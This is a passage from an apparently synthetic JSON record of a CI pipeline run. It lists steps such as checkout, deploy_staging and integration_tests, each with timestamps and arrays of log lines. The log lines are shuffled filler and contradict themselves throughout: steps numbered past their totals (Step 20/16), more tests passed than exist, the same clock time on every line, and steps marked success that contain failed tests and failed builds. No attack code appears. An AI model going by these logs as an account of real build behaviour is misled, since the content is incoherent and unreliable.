          "Pulling image: alpine:18",
          "GET /status - 200 (82ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying main.js",
          "Completed.",
          "[12:46:42] INFO: Connecting to database",
          "NODE_ENV=test",
          "\u2713 Task completed in 3058ms",
          "\u2713 Task completed in 1385ms",
          "[12:46:42] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "Cache miss for key-2570",
          "[12:46:42] DEBUG: Connection pool: 13 active",
          "Layer 9/13: ENV command",
          "Step 20/16: Testing",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (65MB)",
          "Artifact downloaded: 33MB",
          "Bundling styles.js",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Bundling runtime.css",
          "Ran 129 tests in 43s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: RuntimeError",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "[12:46:42] DEBUG: Query executed in 84ms",
          "Using Python 3.11",
          "TLS handshake completed",
          "[12:46:42] DEBUG: Connection pool: 3 active",
          "Fetching submodules...",
          "Image pulled successfully",
          "Uploading artifact 'dist' (10 files)",
          "Compiling src/app.ts...",
          "Done.",
          "Cache saved successfully",
          "NODE_ENV=production",
          "[12:46:42] INFO: Request completed",
          "Switched to branch 'hotfix/task-981'",
          "Test Suites: 39 passed, 17 total",
          "Cache hit for key-9939",
          "Building Docker image...",
          "Generating source maps...",
          "Coverage: 96% statements, 88% branches",
          "Connection established",
          "Fetching from https://gcr.io/package.json",
          "TLS handshake completed",
          "Using Python 3.9",
          "Finished.",
          "Loading...",
          "Minifying main.js",
          "Using Node.js 18.5.3",
          "pip: Collecting eslint",
          "WARNING: eslint has known vulnerabilities",
          "Time: 96.788s",
          "Minifying app.js",
          "Step 8/23: Deploying",
          "Step 6/22: Running migrations",
          "TLS handshake completed",
          "Bundling vendor.js",
          "Layer 4/12: ENV command",
          "pip: Downloading eslint-4.14.tar.gz",
          "[12:46:42] DEBUG: Connection pool: 6 active",
          "Compiling components/app.ts...",
          "[12:46:42] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Cache miss for key-5893",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Test Suites: 27 passed, 27 total",
          "\u2717 build failed with exit code 109",
          "Checking out master branch",
          "Step 4/21: Running migrations",
          "Uploading artifact 'dist' (9 files)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-30T12:46:51.708301",
        "finished_at": "2025-11-30T12:46:55.416446",
        "log_lines": [
          "=== Step: checkout ===",
          "Cache saved successfully",
          "FAILED: test_user_create",
          "Step 14/20: Building",
          "Done.",
          "Using Node.js 16.10.9",
          "[12:46:42] DEBUG: Loading configuration",
          "Verifying...",
          "Ready.",
          "FAILED: test_db_connect",
          "Connection established",
          "Waiting...",
          "Processing...",
          "pip: Collecting axios",
          "Transforming 657 files...",
          "Layer 6/12: COPY command",
          "POST /data - 202 (49ms)",
          "\u2713 All checks passed",
          "Time: 36.543s",
          "Step 3/25: Deploying",
          "pip: Collecting lodash",
          "Image pulled successfully",
          "Generating source maps...",
          "Step 19/22: Installing dependencies",
          "Creating production build...",
          "Finished.",
          "POST /upload - 200 (180ms)",
          "[12:46:42] INFO: Starting build process",
          "  PASS: test_auth_login (453ms)",
          "\u2713 deploy completed",
          "Finished.",
          "pip: Collecting react",
          "Done.",
          "Processing...",
          "[12:46:42] DEBUG: Query executed in 63ms",
          "Step 9/22: Building",
          "[12:46:42] DEBUG: Query executed in 66ms",
          "  PASS: test_api_health (41ms)",
          "[12:46:42] INFO: Connecting to database",
          "Compiling utils/utils.go...",
          "Fetching submodules...",
          "Pushing to registry...",
          "\u2717 build failed with exit code 51",
          "[12:46:42] INFO: Request completed",
          "Already up to date.",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "Connection established",
          "WARNING: express has known vulnerabilities",
          "\u2713 Task completed in 1008ms",
          "Pulling image: node:latest",
          "GET /api - 201 (34ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-4582",
          "\u2713 Task completed in 1152ms",
          "Tests: 367 passed, 132 total",
          "Step 7/19: Linting",
          "Time: 119.817s",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "Waiting...",
          "Already up to date.",
          "Cache invalidated: dependencies",
          "Time: 26.652s",
          "Platform: linux-x64",
          "\u2713 package completed",
          "Checking out main branch",
          "[12:46:42] DEBUG: Initializing service",
          "Step 5/19: Testing",
          "Compiling lib/service.java...",
          "npm notice: created a lockfile",
          "HEAD is now at 78bdede",
          "Step 19/18: Linting",
          "Loading...",
          "Fetching from https://npmjs.org/package.json",
          "Time: 57.59s",
          "POST /data - 201 (125ms)",
          "Cache restored successfully (134MB)",
          "Fetching submodules...",
          "Cache hit for key-6563",
          "Bundling runtime.css",
          "Building Docker image...",
          "[12:46:42] INFO: Request completed",
          "Loading...",
          "Processing...",
          "Waiting...",
          "Step 18/17: Linting",
          "\u2717 build failed with exit code 116",
          "Step 14/18: Building",
          "pip: Downloading lodash-1.18.tar.gz",
          "[12:46:42] INFO: Cache refreshed",
          "GET /api - 204 (7ms)",
          "Time: 107.278s",
          "\u2713 Task completed in 4539ms",
          "npm notice: package.json updated",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: ValueError",
          "Coverage: 86% statements, 70% branches",
          "npm install: resolved 769 packages",
          "Step 4/17: Building",
          "Snapshots: 5 passed, 17 total",
          "pip: Downloading eslint-1.5.tar.gz",
          "Loading...",
          "Fetching submodules...",
          "Step 11/24: Building",
          "[12:46:42] WARN: Deprecated API usage",
          "Checking out main branch",
          "Tests: 139 passed, 466 total",
          "[12:46:42] INFO: Connecting to database",
          "Bundling styles.css",
          "FAILED: test_cache_hit",
          "Step 3/17: Installing dependencies",
          "pip install: Successfully installed lodash-3.0",
          "Artifact uploaded: dist.zip (84MB)",
          "[12:46:42] INFO: Processing request",
          "Step 10/15: Running migrations",
          "Step 12/19: Running migrations",
          "[12:46:42] WARN: Deprecated API usage",
          "[12:46:42] DEBUG: Loading configuration",
          "Time: 113.368s",
          "Platform: darwin-arm64",
          "[12:46:42] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:46:42] INFO: Starting build process",
          "[12:46:42] INFO: Connecting to database",
          "npm install: added 238 packages",
          "Loading...",
          "Step 19/23: Deploying",
          "pip install: Successfully installed eslint-3.8",
          "OK",
          "npm notice: created a lockfile",
          "Connection established",
          "pip install: Successfully installed eslint-5.10",
          "Artifact downloaded: 18MB",
          "npm notice: created a lockfile",
          "Building Docker image...",
          "WARNING: webpack has known vulnerabilities",
          "Bundling runtime.css",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-30T12:46:55.416446",
        "finished_at": "2025-11-30T12:47:00.978663",
        "log_lines": [
          "=== Step: restore_cache ===",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/index.js...",
          "Ran 137 tests in 35s",
          "pip: Installing build dependencies...",
          "Completed.",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Already up to date.",
          "Step 11/23: Running migrations",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 3726ms",
          "Switched to branch 'hotfix/task-167'",
          "Step 16/18: Installing dependencies",
          "Processing...",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:46:42] DEBUG: Query executed in 81ms",
          "[12:46:42] INFO: Connecting to database",
          "  PASS: test_api_health (424ms)",
          "Fetching submodules...",
          "Step 7/22: Deploying",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:46:42] DEBUG: Initializing service",
          "Cache hit for key-8810",
          "[12:46:42] DEBUG: Loading configuration",
          "[12:46:42] INFO: Starting build process",
          "Step 11/19: Testing",
          "Image pulled successfully",
          "Fetching submodules...",
          "Step 7/16: Installing dependencies",
          "GET /api - 200 (38ms)",
          "Finished.",
          "Ran 34 tests in 23s",
          "[12:46:42] DEBUG: Query executed in 18ms",
          "Minifying app.js",
          "Step 7/21: Building",
          "  PASS: unit/test_db_connect.spec.js",
          "Completed.",
          "[12:46:42] DEBUG: Loading configuration",
          "Step 4/20: Deploying",
          "Completed.",
          "Platform: linux-x64",
          "\u2713 All checks passed",
          "Cache miss for key-4833",
          "[12:46:42] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: created a lockfile",
          "Step 18/23: Testing",
          "HEAD is now at bff2d7a",
          "Transforming 341 files...",
          "[12:46:42] DEBUG: Memory usage: 659MB",
          "POST /data - 200 (485ms)",
          "Test Suites: 39 passed, 40 total",
          "Processing...",
          "Transforming 501 files...",
          "Fetching from https://registry.npmjs.org/package.json",
          "Compiling src/utils.go...",
          "[12:46:42] WARN: Deprecated API usage",
          "Coverage: 78% statements, 97% branches",
          "Using Python 3.11",
          "npm install: resolved 576 packages",
          "Generating source maps...",
          "Generating source maps...",
          "Time: 17.855s",
          "Bundling runtime.css",
          "Cache invalidated: node_modules",
          "Step 14/16: Running migrations",
          "POST /data - 201 (382ms)",
          "[12:46:42] WARN: Deprecated API usage",
          "Generating source maps...",
          "  PASS: test_api_health (203ms)",
          "Pulling image: alpine:latest",
          "Waiting...",
          "\u2713 package completed",
          "yarn add: Done in 4.53s",
          "pip install: Successfully installed webpack-5.6",
          "\u2717 build failed with exit code 3",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 1837 packages",
          "Fetching from https://amazonaws.com/package.json",
          "[12:46:42] INFO: Request completed",
          "Installing webpack@4.12.1",
          "pip: Downloading lodash-4.16.tar.gz",
          "Image pulled successfully",
          "Step 13/21: Linting",
          "Ran 53 tests in 10s",
          "Building Docker image...",
          "Using Node.js 16.5.1",
          "\u2713 All checks passed",
          "[12:46:42] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Finished.",
          "POST /data - 201 (451ms)",
          "Done.",
          "Using Node.js 15.0.7",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:46:42] DEBUG: Memory usage: 817MB",
          "Exception: RuntimeError",
          "Cache miss for key-5480",
          "Ready.",
          "[12:46:42] INFO: Request completed",
          "Image pulled successfully",
          "Uploading artifact 'coverage' (49 files)",
          "Pulling image: python:3.11",
          "GET /status - 201 (62ms)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "WARNING: webpack has known vulnerabilities",
          "NODE_ENV=test",
          "Success!",
          "Transforming 482 files...",
          "\u2713 build completed",
          "TLS handshake completed",
          "Artifact uploaded: dist.zip (67MB)",
          "[12:46:42] WARN: Deprecated API usage",
          "[12:46:42] INFO: Processing request",
          "Cache miss for key-2388",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 Step 'checkout' succeeded",
          "Step 16/24: Deploying",
          "Already up to date.",
          "\u2713 All checks passed",
          "yarn add: Done in 30.83s",
          "Cache invalidated: dependencies",
          "WARNING: express has known vulnerabilities",
          "pip install: Successfully installed webpack-3.16",
          "[12:46:42] DEBUG: Query executed in 77ms",
          "[12:46:42] WARN: Deprecated API usage",
          "Artifact downloaded: 3MB",
          "Checking out main branch",
          "pip: Installing build dependencies...",
          "Step 9/23: Installing dependencies",
          "Switched to branch 'feature/task-529'",
          "Compiling lib/utils.go...",
          "Uploading artifact 'build' (1 files)",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:42] INFO: Connecting to database",
          "Test Suites: 6 passed, 42 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/22: Running migrations",
          "Compiling lib/utils.go...",
          "[12:46:42] WARN: Deprecated API usage",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-30T12:47:00.978663",
        "finished_at": "2025-11-30T12:47:10.249025",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache invalidated: build",
          "Environment: staging",
          "  PASS: test_cache_hit (434ms)",
          "POST /upload - 201 (332ms)",
          "Ran 70 tests in 34s",
          "Compiling lib/service.java...",
          "Cache invalidated: node_modules",
          "GET /status - 200 (29ms)",
          "[12:46:42] DEBUG: Loading configuration",
          "\u2713 package completed",
          "Compiling components/app.ts...",
          "Connection established",
          "WARNING: prettier has known vulnerabilities",
          "Test Suites: 40 passed, 12 total",
          "Using Python 3.10",
          "Image pulled successfully",
          "Waiting...",
          "Generating source maps...",
          "[12:46:42] INFO: Connecting to database",
          "\u2713 Task completed in 268ms",
          "[12:46:42] DEBUG: Initializing service",
          "[12:46:42] DEBUG: Initializing service",
          "[12:46:42] INFO: Connecting to database",
          "[12:46:42] INFO: Request completed",
          "Bundling styles.js",
          "Waiting...",
          "Already up to date.",
          "Coverage: 81% statements, 96% branches",
          "WARNING: express has known vulnerabilities",
          "Using Node.js 14.7.3",
          "[12:46:42] DEBUG: Initializing service",
          "Switched to branch 'feature/task-391'",
          "[12:46:42] DEBUG: Memory usage: 1001MB",
          "Time: 55.541s",
          "Compiling utils/app.ts...",
          "[12:46:42] INFO: Connecting to database",
          "Switched to branch 'hotfix/task-475'",
          "Fetching submodules...",
          "GET /status - 200 (28ms)",
          "OK",
          "Step 13/24: Running migrations",
          "TLS handshake completed",
          "Fetching submodules...",
          "Transforming 195 files...",
          "Pushing to registry...",
          "Pushing to registry...",
          "Test Suites: 50 passed, 9 total",
          "Building Docker image...",
          "Minifying vendor.js",
          "Finished.",
          "Step 15/17: Testing",
          "Environment: test",
          "[12:46:42] INFO: Request completed",
          "Ran 131 tests in 55s",
          "Compiling src/app.ts...",
          "Switched to branch 'hotfix/task-989'",
          "\u2713 Step 'install' succeeded",
          "FAILED: test_auth_login",
          "Completed.",
          "yarn add: Done in 9.70s",
          "npm install: added 326 packages",
          "[12:46:42] WARN: Deprecated API usage",
          "FAILED: test_db_connect",
          "Step 17/23: Building",
          "[12:46:42] INFO: Starting build process",
          "WARNING: jest has known vulnerabilities",
          "POST /api - 201 (265ms)",
          "[12:46:42] DEBUG: Query executed in 24ms",
          "WARNING: lodash has known vulnerabilities",
          "pip: Downloading prettier-5.7.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:42] DEBUG: Connection pool: 2 active",
          "Bundling main.css",
          "Ready.",
          "NODE_ENV=production",
          "Ready.",
          "POST /api - 201 (181ms)",
          "npm install: resolved 1012 packages",
          "Cache miss for key-4505",
          "Step 9/17: Building",
          "Bundling styles.css",
          "Pulling image: node:3.11",
          "  PASS: test_api_health (319ms)",
          "Compiling components/handler.rs...",
          "Pushing to registry...",
          "Already up to date.",
          "Loading...",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:42] DEBUG: Memory usage: 1754MB",
          "Pushing to registry...",
          "Artifact downloaded: 46MB",
          "Pulling image: python:3.11",
          "[12:46:42] ERROR: Connection failed",
          "NODE_ENV=production",
          "GET /api - 200 (96ms)",
          "Step 12/24: Running migrations",
          "  PASS: test_db_connect (295ms)",
          "Pulling image: alpine:latest",
          "FAILED: test_user_create",
          "Checking out master branch",
          "npm notice: created a lockfile",
          "Exception: ValueError",
          "Ran 132 tests in 7s",
          "\u2713 All checks passed",
          "FAILED: test_db_connect",
          "Step 2/18: Deploying",
          "Cache miss for key-2692",
          "Artifact downloaded: 21MB",
          "Optimizing 58 modules...",
          "Test Suites: 27 passed, 20 total",
          "[12:46:42] INFO: Request completed",
          "Step 2/15: Deploying",
          "Exception: NullPointerException",
          "Tests: 394 passed, 232 total",
          "Uploading artifact 'dist' (1 files)",
          "Installing prettier@3.20.3",
          "Tests: 65 passed, 300 total",
          "Creating production build...",
          "Compiling lib/utils.go...",
          "Ran 165 tests in 40s",
          "Compiling components/app.ts...",
          "Step 17/24: Linting",
          "[12:46:42] DEBUG: Loading configuration",
          "yarn add: Done in 2.25s",
          "[12:46:42] INFO: Request completed",
          "Loading...",
          "NODE_ENV=production",
          "Switched to branch 'bugfix/task-678'",
          "Generating source maps...",
          "Minifying vendor.js",
          "Pushing to registry...",
          "Cache hit for key-6743",
          "npm notice: package.json updated",
          "pip: Downloading express-1.12.tar.gz",
          "Transforming 111 files...",
          "[12:46:42] INFO: Starting build process",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-30T12:47:10.249025",
        "finished_at": "2025-11-30T12:47:28.789750",
        "log_lines": [
          "=== Step: integration_tests ===",
          "GET /api - 204 (14ms)",
          "Building Docker image...",
          "WARNING: express has known vulnerabilities",
          "TLS handshake completed",
          "Ran 74 tests in 23s",
          "FAILED: test_user_create",
          "Ready.",
          "yarn add: Done in 4.16s",
          "Optimizing 82 modules...",
          "[12:46:42] INFO: Cache refreshed",
          "Verifying...",
          "[12:46:42] DEBUG: Query executed in 17ms",
          "Exception: TypeError",
          "Image pulled successfully",
          "Already up to date.",
          "Checking out master branch",
          "Completed.",
          "WARNING: react has known vulnerabilities",
          "[12:46:42] INFO: Cache refreshed",
          "yarn add: Done in 25.45s",
          "Completed.",
          "Compiling utils/utils.go...",
          "Cache saved successfully",
          "Compiling components/service.java...",
          "Using Python 3.11",
          "Finished.",
          "npm notice: package.json updated",
          "[12:46:42] DEBUG: Initializing service",
          "Step 8/24: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "NODE_ENV=test",
          "Minifying app.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_auth_login",
          "Done.",
          "Done.",
          "Artifact uploaded: dist.zip (28MB)",
          "Step 15/22: Building",
          "npm notice: created a lockfile",
          "Step 7/18: Deploying",
          "Cache saved successfully",
          "npm install: added 41 packages",
          "Using Node.js 18.11.4",
          "npm notice: created a lockfile",
          "Platform: darwin-arm64",
          "[12:46:42] INFO: Request completed",
          "WARNING: jest has known vulnerabilities",
          "Generating source maps...",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (18MB)",
          "HEAD is now at 281f84e",
          "Switched to branch 'feature/task-451'",
          "Pushing to registry...",
          "Connection established",
          "Compiling components/utils.go...",
          "Connection established",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Already up to date.",
          "Step 8/20: Linting",
          "Using Python 3.11",
          "pip: Downloading lodash-4.15.tar.gz",
          "Cache miss for key-1920",
          "[12:46:42] DEBUG: Initializing service",
          "Step 18/19: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "FAILED: test_auth_login",
          "Cache restored successfully (240MB)",
          "Tests: 431 passed, 373 total",
          "[12:46:42] DEBUG: Memory usage: 592MB",
          "Using Node.js 16.0.5",
          "Checking out master branch",
          "Compiling lib/service.java...",
          "Artifact uploaded: dist.zip (35MB)",
          "npm notice: package.json updated",
          "Compiling lib/utils.go...",
          "npm install: resolved 1879 packages",
          "Bundling runtime.js",
          "Finished.",
          "Cache invalidated: build",
          "\u2713 package completed",
          "Cache restored successfully (458MB)",
          "[12:46:42] INFO: Request completed",
          "WARNING: webpack has known vulnerabilities",
          "Finished.",
          "Finished.",
          "Cache invalidated: build",
          "Uploading artifact 'dist' (46 files)",
          "Compiling utils/index.js...",
          "Test Suites: 23 passed, 8 total",
          "Artifact uploaded: build.tar.gz (17MB)",
          "WARNING: eslint has known vulnerabilities",
          "Step 13/18: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-5904",
          "Processing...",
          "Using Node.js 18.16.1",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Processing...",
          "Optimizing 81 modules...",
          "Cache hit for key-8540",
          "Cache hit for key-2975",
          "Snapshots: 16 passed, 40 total",
          "npm install: resolved 1927 packages",
          "Done.",
          "Test Suites: 49 passed, 38 total",
          "pip: Collecting webpack",
          "Generating source maps...",
          "Switched to branch 'feature/task-277'",
          "HEAD is now at eac77c5",
          "Layer 8/10: RUN command",
          "\u2713 All checks passed",
          "  PASS: unit/test_api_health.spec.js",
          "[12:46:42] WARN: Deprecated API usage",
          "\u2713 Task completed in 4950ms",
          "pip install: Successfully installed jest-1.11",
          "Time: 17.943s",
          "[12:46:42] INFO: Connecting to database",
          "\u2713 Task completed in 2124ms",
          "npm install: added 186 packages",
          "Step 11/23: Installing dependencies",
          "[12:46:42] DEBUG: Initializing service",
          "FAILED: test_auth_login",
          "Success!",
          "[12:46:42] INFO: Cache refreshed",
          "Finished.",
          "Success!",
          "Cache restored successfully (296MB)",
          "pip install: Successfully installed lodash-1.4",
          "Step 19/23: Building",
          "Optimizing 79 modules...",
          "pip install: Successfully installed eslint-2.10",
          "[12:46:42] DEBUG: Initializing service",
          "[12:46:42] DEBUG: Loading configuration",
          "Compiling utils/main.py...",
          "POST /upload - 200 (335ms)",
          "GET /health - 204 (30ms)",
          "yarn add: Done in 20.60s",
          "Platform: win32-x64",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-30T12:47:28.789750",
        "finished_at": "2025-11-30T12:47:38.060112",
        "log_lines": [
          "=== Step: type_check ===",
          "Waiting...",
          "Fetching submodules...",
          "POST /upload - 201 (378ms)",
          "Artifact downloaded: 1MB",
          "[12:46:42] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "[12:46:42] DEBUG: Loading configuration",
          "Bundling styles.css",
          "npm notice: package.json updated",
          "Processing...",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "pip install: Successfully installed jest-1.2",
          "Completed.",
          "Image pulled successfully",
          "Transforming 677 files...",
          "[12:46:42] WARN: Deprecated API usage",
          "[12:46:42] WARN: Deprecated API usage",
          "[12:46:42] INFO: Processing request",
          "pip: Downloading prettier-5.2.tar.gz",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:42] DEBUG: Query executed in 62ms",
          "[12:46:42] DEBUG: Loading configuration",
          "Pushing to registry...",
          "[12:46:42] INFO: Starting build process",
          "Connection established",
          "Ran 94 tests in 27s",
          "\u2713 Task completed in 191ms",
          "Step 18/23: Testing",
          "Minifying app.js",
          "Connection established",
          "[12:46:42] INFO: Request completed",
          "Exception: TypeError",
          "Waiting...",
          "[12:46:42] INFO: Processing request",
          "Cache saved successfully",
          "Coverage: 98% statements, 87% branches",
          "[12:46:42] DEBUG: Loading configuration",
          "Compiling lib/app.ts...",
          "Completed.",
          "Processing...",
          "\u2713 All checks passed",
          "[12:46:42] DEBUG: Memory usage: 766MB",
          "npm install: resolved 190 packages",
          "pip: Downloading eslint-4.3.tar.gz",
          "Creating production build...",
          "Success!",
          "Cache restored successfully (108MB)",
          "npm notice: package.json updated",
          "[12:46:42] DEBUG: Connection pool: 11 active",
          "\u2713 Task completed in 3979ms",
          "Test Suites: 48 passed, 44 total",
          "Tests: 194 passed, 412 total",
          "[12:46:42] INFO: Processing request",
          "[12:46:42] INFO: Starting build process",
          "Uploading artifact 'coverage' (34 files)",
          "\u2713 Task completed in 777ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 1292ms",
          "npm notice: created a lockfile",
          "Optimizing 65 modules...",
          "Verifying...",
          "npm install: resolved 1118 packages",
          "GET /health - 204 (66ms)",
          "[12:46:42] DEBUG: Loading configuration",
          "Using Python 3.11",
          "Fetching submodules...",
          "[12:46:42] DEBUG: Query executed in 86ms",
          "Snapshots: 40 passed, 34 total",
          "Finished.",
          "Fetching submodules...",
          "Bundling runtime.css",
          "Pushing to registry...",
          "\u2713 Task completed in 3085ms",
          "Using Node.js 14.19.3",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Compiling lib/utils.go...",
          "Finished.",
          "\u2713 Task completed in 2239ms",
          "Step 6/18: Building",
          "Using Node.js 16.13.1",
          "Done.",
          "Cache miss for key-3149",
          "Transforming 782 files...",
          "[12:46:42] INFO: Cache refreshed",
          "\u2713 test completed",
          "Cache restored successfully (50MB)",
          "Step 15/22: Building",
          "Layer 6/13: COPY command",
          "\u2713 package completed",
          "Using Python 3.12",
          "npm install: added 385 packages",
          "Snapshots: 47 passed, 31 total",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting axios",
          "Checking out master branch",
          "\u2717 build failed with exit code 21",
          "Generating source maps...",
          "Checking out main branch",
          "Completed.",
          "[12:46:42] INFO: Starting build process",
          "Step 2/15: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 98% statements, 76% branches",
          "Bundling runtime.js",
          "NODE_ENV=production",
          "NODE_ENV=test",
          "Compiling src/service.java...",
          "Compiling components/main.py...",
          "[12:46:42] INFO: Cache refreshed",
          "Step 1/17: Testing",
          "Step 5/19: Testing",
          "Connection established",
          "Fetching submodules...",
          "Creating production build...",
          "NODE_ENV=production",
          "[12:46:42] INFO: Processing request",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "[12:46:42] DEBUG: Initializing service",
          "Snapshots: 29 passed, 16 total",
          "OK",
          "[12:46:42] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Test Suites: 29 passed, 35 total",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "npm install: added 301 packages",
          "[12:46:42] DEBUG: Memory usage: 1262MB",
          "[12:46:42] DEBUG: Connection pool: 2 active",
          "\u2713 Task completed in 789ms",
          "Coverage: 82% statements, 79% branches",
          "TLS handshake completed",
          "[12:46:42] INFO: Processing request",
          "Platform: darwin-arm64",
          "Fetching from https://npmjs.org/package.json",
          "[12:46:42] WARN: Deprecated API usage",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-30T12:47:38.060112",
        "finished_at": "2025-11-30T12:48:05.871199",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 7/24: Building",
          "Finished.",
          "Installing prettier@3.13.1",
          "FAILED: test_auth_login",
          "pip install: Successfully installed axios-2.19",
          "[12:46:42] INFO: Processing request",
          "[12:46:42] WARN: Deprecated API usage",
          "Creating production build...",
          "[12:46:42] DEBUG: Initializing service",
          "[12:46:42] DEBUG: Connection pool: 16 active",
          "\u2713 Task completed in 330ms",
          "Test Suites: 46 passed, 21 total",
          "Waiting...",
          "Step 15/21: Building",
          "pip: Installing build dependencies...",
          "Using Python 3.9",
          "Time: 65.414s",
          "TLS handshake completed",
          "Cache hit for key-6188",
          "HEAD is now at 6520d6c",
          "[12:46:42] INFO: Connecting to database",
          "Cache invalidated: build",
          "Completed.",
          "Generating source maps...",
          "OK",
          "Waiting...",
          "\u2713 All checks passed",
          "Cache saved successfully",
          "Compiling lib/index.js...",
          "Success!",
          "pip install: Successfully installed lodash-5.1",
          "[12:46:42] DEBUG: Connection pool: 20 active",
          "Image pulled successfully",
          "Generating source maps...",
          "Step 16/20: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'checkout' succeeded",
          "HEAD is now at db01e63",
          "NODE_ENV=test",
          "Compiling utils/main.py...",
          "Transforming 178 files...",
          "Snapshots: 17 passed, 7 total",
          "Tests: 75 passed, 464 total",
          "Ran 64 tests in 28s",
          "[12:46:42] INFO: Cache refreshed",
          "Step 2/19: Deploying",
          "Transforming 224 files...",
          "GET /status - 200 (76ms)",
          "\u2713 All checks passed",
          "Ran 67 tests in 46s",
          "Using Python 3.9",
          "Optimizing 43 modules...",
          "Artifact uploaded: dist.zip (94MB)",
          "Building Docker image...",
          "Cache restored successfully (53MB)",
          "Done.",
          "Processing...",
          "Step 16/24: Installing dependencies",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "OK",
          "pip: Collecting react",
          "npm install: added 44 packages",
          "Bundling main.js",
          "WARNING: lodash has known vulnerabilities",
          "OK",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:46:42] INFO: Request completed",
          "OK",
          "Tests: 497 passed, 462 total",
          "\u2713 Task completed in 2772ms",
          "Artifact uploaded: dist.zip (94MB)",
          "yarn add: Done in 29.29s",
          "Pulling image: python:latest",
          "Test Suites: 33 passed, 34 total",
          "\u2713 Task completed in 3210ms",
          "POST /data - 202 (451ms)",
          "OK",
          "Compiling src/utils.go...",
          "Processing...",
          "pip: Installing build dependencies...",
          "Cache restored successfully (87MB)",
          "POST /data - 201 (424ms)",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/utils.go...",
          "Cache saved successfully",
          "TLS handshake completed",
          "Cache restored successfully (378MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: test",
          "[12:46:42] INFO: Processing request",
          "Image pulled successfully",
          "Waiting...",
          "Compiling utils/main.py...",
          "Time: 105.922s",
          "Transforming 997 files...",
          "Artifact downloaded: 22MB",
          "[12:46:42] DEBUG: Loading configuration",
          "GET /api - 201 (22ms)",
          "Done.",
          "\u2713 Step 'test' succeeded",
          "Uploading artifact 'build' (19 files)",
          "Installing jest@5.0.8",
          "Ran 126 tests in 8s",
          "Creating production build...",
          "Environment: development",
          "Checking out develop branch",
          "Generating source maps...",
          "\u2713 package completed",
          "Finished.",
          "[12:46:42] INFO: Starting build process",
          "  PASS: test_api_health (103ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Fetching from https://googleapis.com/package.json",
          "Uploading artifact 'build' (19 files)",
          "Switched to branch 'hotfix/task-227'",
          "[12:46:42] WARN: Deprecated API usage",
